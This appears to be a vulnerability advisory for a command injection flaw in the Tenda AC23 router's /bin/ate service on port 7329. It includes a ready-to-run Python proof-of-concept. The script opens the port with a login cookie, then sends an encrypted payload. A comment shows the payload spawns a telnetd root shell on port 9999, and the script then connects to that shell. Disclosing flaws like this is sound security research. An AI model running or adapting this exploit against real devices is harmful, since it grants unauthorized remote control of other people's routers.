# Tenda AC23(V16.03.07.45_cn) has a command injection Vulnerability

## product 

1. product information: https://www.tenda.com.cn/ 
2. firmware download:https://www.tenda.com.cn/download/detail-3420.html

## vulnerability 

The vulnerability is in `/bin/ate`, we can send msg to it through port `7329`. 

 An authenticated attacker can start this port via httpd. 

In `/bin/ate`, the `ifconfig_`(sub_40A8C8) function has command injection vulnerability. 

![image-20230429232104998](https://github.com/xinzhihen06/ac23tenda/blob/main/image1.png)

It pass input value `a1` to `v2`, and `v2` will pause to `doSystemCmd` 

## poc

1. You need to login and **replace the Cookie: password filed in poc**.
2. By sending  poc, it can cause rce. 

```
import os
import socket
import requests

def attack(ip, port):
    cookie = {
        "password": "25d55ad283aa400af464c76d713c07admvpcvb"
    }
    ret = requests.get('http://%s/goform/ate'%ip, cookies=cookie)
    if '200' in ret:
        print("[*] 7329 opened")
    else:
        ret
    p = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    p.connect((ip, port))
    # payload = b'ifconfig \n\r;telnetd -l /bin/sh -p 9999; \n\r\n\r\n\r\n\r'
    payload =  b'\x99\xbf\xbb\xe4\x1f\x31\x3a\x01\x01\x12\xe7\xc9\x5c\xbe\xd9\x6f'
    payload += b'\x45\xe3\xbd\x8f\x3d\xeb\xfd\x7a\x91\x6d\x16\xd6\x27\x78\xa0\x3e'
    payload += b'\x96\x02\x25\x6e\xcc\x7d\x89\x22\x3b\x91\xa3\x6d\x2f\x2b\xb5\x2b'
    p.send(payload)

    os.system('telnet %s 9999'%ip)

if __name__ == '__main__':
    attack('192.168.1.1', 7329)
```

##Author

xiquan Deng
